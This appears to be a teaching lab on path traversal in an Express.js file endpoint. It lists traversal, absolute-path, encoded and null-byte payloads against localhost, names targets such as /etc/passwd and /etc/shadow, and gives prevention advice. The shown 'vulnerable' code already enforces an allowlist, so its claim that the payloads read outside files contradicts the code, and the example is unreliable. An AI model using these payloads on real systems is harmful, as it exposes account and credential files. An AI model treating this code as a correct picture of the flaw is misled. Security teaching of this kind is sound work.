# Path Traversal Exercise

## Objective
Learn how path traversal vulnerabilities allow attackers to access files outside the intended directory.

## What is Path Traversal?
Path traversal (also known as directory traversal) occurs when user input is used to construct file paths without proper validation, allowing access to files outside the intended directory.

## Vulnerable Code
```javascript
app.get('/file', (req, res) => {
  const filename = req.query.file || 'welcome.txt';
  const filePath = path.join(__dirname, 'public', 'files', filename);
  
  const allowedFiles = ['welcome.txt', 'about.txt', 'contact.txt'];
  if (allowedFiles.includes(filename)) {
    res.sendFile(filePath);
  }
});
```

## Exercise Instructions

### Step 1: Access Allowed File
Try accessing an allowed file:
```
http://localhost:3000/file?file=welcome.txt
```

### Step 2: Basic Path Traversal
Try using `../` to move up directories:
```
http://localhost:3000/file?file=../../package.json
```

### Step 3: Absolute Path
Try using absolute paths:
```
http://localhost:3000/file?file=/etc/passwd
```

### Step 4: URL Encoding
Try URL-encoded traversal:
```
http://localhost:3000/file?file=..%2F..%2Fpackage.json
```

### Step 5: Double Encoding
Try double URL encoding:
```
http://localhost:3000/file?file=..%252F..%252Fpackage.json
```

### Step 6: Null Byte Injection (if applicable)
Try null byte injection (older systems):
```
http://localhost:3000/file?file=../../etc/passwd%00
```

## Expected Results
- Should be able to read files outside the intended directory
- Can access sensitive system files on Unix/Linux systems

## Prevention
1. Validate and sanitize file paths
2. Use whitelist of allowed files
3. Use path normalization
4. Run with least privileges
5. Don't pass user input directly to file system functions

## Secure Code Example
```javascript
app.get('/file', (req, res) => {
  const filename = req.query.file || 'welcome.txt';
  const allowedFiles = ['welcome.txt', 'about.txt', 'contact.txt'];
  
  if (!allowedFiles.includes(filename)) {
    return res.status(403).send('Access denied');
  }
  
  const filePath = path.join(__dirname, 'public', 'files', filename);
  const normalizedPath = path.normalize(filePath);
  
  if (!normalizedPath.startsWith(path.join(__dirname, 'public', 'files'))) {
    return res.status(403).send('Access denied');
  }
  
  res.sendFile(normalizedPath);
});
```

## Common Targets
- `/etc/passwd` (Unix user accounts)
- `/etc/shadow` (Unix password hashes)
- `C:\Windows\win.ini` (Windows configuration)
- Application configuration files
- Source code files
